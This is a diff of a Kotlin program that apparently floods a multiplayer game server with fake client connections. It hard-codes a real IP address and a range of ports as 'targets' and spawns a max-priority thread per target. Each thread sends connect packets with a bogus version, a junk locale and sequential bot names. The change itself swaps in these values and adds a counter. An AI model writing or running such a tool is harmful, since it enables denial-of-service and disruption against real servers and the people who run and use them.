@@ -15,7 +15,7 @@ import java.util.Timer
 import java.util.TimerTask
 
 var targets = listOf(
-    "109.94.209.233",
+    "109.94.209.233:6567",
     "109.94.209.233:6568",
     "109.94.209.233:6569",
     "109.94.209.233:6570",
@@ -24,6 +24,8 @@ var targets = listOf(
     "109.94.209.233:6573",
     "109.94.209.233:6574"
 )
+
+var counter = 0
 
 fun main() {
     init()
@@ -37,6 +39,8 @@ fun main() {
 
     targets.forEach { target ->
         Log.info(target)
+
+        counter++
 
         val thread = Thread { task(target) }
         thread.priority = Thread.MAX_PRIORITY;
@@ -60,11 +64,11 @@ private fun packet(): ConnectPacket {
     val packet = ConnectPacket()
 
     packet.version = -1
-    packet.versionType = "official"
+    packet.versionType = "hentai"
 
-    packet.name = Rand().random(-99999, 99999).toString()
+    packet.name = "nekonya-" + counter
     packet.color = 255
-    packet.locale = "ru"
+    packet.locale = "hentai"
 
     packet.mods = Seq()
     packet.mobile = false
